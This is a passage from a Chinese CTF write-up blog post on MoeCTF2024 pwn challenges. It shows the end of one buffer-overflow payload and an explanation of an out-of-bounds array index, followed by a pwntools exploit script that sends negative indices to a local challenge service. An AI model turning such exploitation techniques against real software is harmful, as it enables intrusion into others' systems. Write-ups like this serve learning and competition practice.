class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(unreachable_addr)<br>s(payload)<br>inter()<br></code></pre></td></tr></table></figure>

<p>给的是一个结构体，直接玩肯定玩不出来，看到数组想到下标越界</p>
<img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723540870980-9f33a9a2-4215-4363-9bb5-b5dea8b74912.png" srcset="/img/loading.gif" lazyload class="" title="img">

<p>还能修改其实就是任意地址改写，直接把距离改大会告诉我不过，后面考虑改速度，速度大一点好像没事，不用距离刚刚好</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br><span class="hljs-comment">#filename=&#x27;./lockedshell&#x27;</span><br><span class="hljs-comment">#elf = ELF(filename)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>	io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">33241</span>)<br><span class="hljs-keyword">else</span>:<br>	io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>	<span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br>	<span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br><br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Which engine?\n&#x27;</span>,<span class="hljs-string">&#x27;-16&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Thrust in percentage (0 ~ 100).\n&#x27;</span>,<span class="hljs-string">&#x27;32&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Which engine?\n&#x27;</span>,<span class="hljs-string">&#x27;-15&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Thrust in percentage (0 ~ 100).\n&#x27;</span>,<span class="hljs-string">&#x27;16&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Which engine?\n&#x27;</span>,<span class="hljs-string">&#x27;-5&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Thrust in percentage (0 ~ 100).\n&#x27;</span>,<span class="hljs-string">&#x27;50&#x27;</span>)<br><br><br>inter()<br></code></pre></td></tr></table></figure>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%AF%94%E8%B5%9Bwp/" class="category-chain-item">比赛wp</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/z3/" class="print-no-link">#z3</a>
      
        <a href="/tags/tea%E9%AD%94%E6%94%B9/" class="print-no-link">#tea魔改</a>
      
        <a href="/tags/cython/" class="print-no-link">#cython</a>
      
        <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="print-no-link">#栈迁移</a>
      
        <a href="/tags/sm4%E5%8A%A0%E5%AF%86/" class="print-no-link">#sm4加密</a>
      
        <a href="/tags/shellcode/" class="print-no-link">#shellcode</a>
      
        <a href="/tags/%E8%BF%B7%E5%AE%AB/" class="print-no-link">#迷宫</a>
      
        <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" class="print-no-link">#反调试</a>
      
        <a href="/tags/e%E8%AF%AD%E8%A8%80/" class="print-no-link">#e语言</a>
      
        <a href="/tags/%E7%88%86%E7%A0%B4flag/" class="print-no-link">#爆破flag</a>
      
        <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" class="print-no-link">#格式化字符串</a>
      
        <a href="/tags/SROP/" class="print-no-link">#SROP</a>
      
        <a href="/tags/RSA/" class="print-no-link">#RSA</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>MoeCTF2024部分Re与Pwn</div>
      <div>https://j1ya-22.github.io/2024/10/12/MoeCTF2024部分Re与Pwn/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>j1ya</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年10月12日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/10/16/IDA%E7%9B%B8%E5%85%B3/" title="IDA相关">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">IDA相关</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/09/19/%E9%85%8D%E7%BD%AERust%E7%8E%AF%E5%A2%83/" title="配置Rust环境">
                        <span class="hidden-mobile">配置Rust环境</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"5oPqGOgpqzM186wdJq3YyrcV-gzGzoHsz","appKey":"tdZv3tC3tP1IszSKxEodRe6e","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
